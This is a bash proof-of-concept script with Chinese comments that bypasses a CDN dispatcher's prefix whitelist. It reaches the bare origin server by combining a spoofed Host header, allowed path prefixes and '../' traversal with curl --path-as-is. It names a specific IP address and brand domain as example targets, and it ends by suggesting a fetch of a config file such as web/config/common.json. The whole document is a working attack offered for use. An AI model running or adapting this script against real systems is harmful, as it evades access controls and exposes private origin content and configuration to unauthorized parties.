#!/bin/bash
# 前置分发器前缀白名单绕过（CDN 绕过 → 裸源站）
# 用法: bash dispatcher-bypass.sh BASE_URL BRAND_HOST PATH
#   BASE_URL    裸节点入口，例如 http://135.84.243.119:7730
#   BRAND_HOST  该节点映射的品牌域名（Host 分流用），例如 7h77.com
#   PATH        想访问的源站真实路径，例如 web/simple.php
# ---- 参数检查 ----
if [ $# -lt 3 ]; then printf '用法: ./poc.sh <BASE_URL> <BRAND_HOST> <PATH>\n' >&2; exit 1; fi
BASE="${1:?BASE}"; HOSTH="${2:?HOST}"; P="${3:?PATH}"

echo "== 0) 无 Host（应出现 90010 / 90006 / 90087）"
curl -sk -m 12 -o /dev/null -w '  %{http_code} %{size_download}\n' "$BASE/$P"

echo "== 1) 带 Host，直连真实前缀（预期 308 -> CDN 边缘）"
curl -sk -m 12 --path-as-is -D - -o /dev/null -H "Host: $HOSTH" "$BASE/$P" | head -5

echo "== 2) 放行前缀 + ../ 归一化（预期 200 源站内容）"
for pre in entrance infe; do
  printf '  [%s] ' "$pre"
  curl -sk -m 12 --path-as-is -o /tmp/db_body -w '%{http_code} %{size_download}\n' \
       -H "Host: $HOSTH" "$BASE/$pre/../$P"
  head -c 160 /tmp/db_body | tr -d '\n'; echo
done

# 判定：
#  步骤2 返回 200 且 body 是应用页面/真实资源 => 绕过成立，后续任意路径都可无 CDN 直测：
#    curl -sk --path-as-is -H "Host: $HOSTH" -o out -w '%{http_code}\n' "$BASE/entrance/../web/config/common.json"
#  注意：必须 --path-as-is，否则客户端会把 .. 归一化，绕过失效。
